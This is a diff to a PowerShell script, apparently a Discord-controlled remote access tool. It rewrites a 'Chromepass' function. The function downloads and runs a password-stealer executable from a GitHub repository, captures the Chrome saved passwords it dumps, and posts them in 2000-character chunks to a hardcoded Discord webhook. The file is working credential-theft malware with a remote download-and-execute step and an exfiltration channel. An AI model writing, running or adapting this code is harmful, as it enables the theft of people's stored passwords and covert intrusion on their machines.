@@ -785,33 +785,46 @@ param ([int[]]$t)
 # --------------------------------------------------------------- CHROMEPASS FUNCTION ------------------------------------------------------------------------
 
 function Chromepass {
-    # Define the download and execution details
+    # Set webhook URL
+    $webhookUrl = 'https://discord.com/api/webhooks/1296149599156703366/FKW6CjNR0Tm-CBaBtWT5f-xN9TPDq6hVJlrseuVLAXKa-iRl2gD28HKhcx-1_e2Dr02n'
+
+    # URL and path for the executable
     $exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chrome.exe'
-    $exePath = '.\chrome.exe'
-    
-    # Download the executable if it doesn't already exist
+    $exePath = ".\chrome.exe"
+
+    # Download executable if not present
     if (-not (Test-Path -Path $exePath)) {
         Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
     }
-    
+
     # Run the executable and capture output
     $commandOutput = & $exePath | Out-String
-    
-    # Split the output into chunks for sending
-    $chunks = [Math]::Ceiling($commandOutput.Length / 2000)
+
+    # Divide output into chunks of 2000 characters for Discord webhook
+    $chunkSize = 2000
+    $chunks = [Math]::Ceiling($commandOutput.Length / $chunkSize)
     for ($i = 0; $i -lt $chunks; $i++) {
-        $start = $i * 2000
-        $length = [Math]::Min(2000, $commandOutput.Length - $start)
+        $start = $i * $chunkSize
+        $length = [Math]::Min($chunkSize, $commandOutput.Length - $start)
         $content = $commandOutput.Substring($start, $length)
-        
-        # Send each chunk through the bot's message function
-        sendMsg -Message ":lock: Chrome Passwords: $content"
-        
+
+        # Prepare content for webhook
+        $webhookContent = @{
+            username = 'Flipper'
+            content = $content
+        }
+
+        # Convert to JSON and send to webhook
+        $jsonData = $webhookContent | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json'
+
         # Delay to prevent rate limiting
         Start-Sleep -Seconds 1
     }
 }
 
+# Call Chromepass function where appropriate
+# Ensure it is triggered based on message or main loop logic
 
 
 # --------------------------------------------------------------- ADMIN FUNCTIONS ------------------------------------------------------------------------
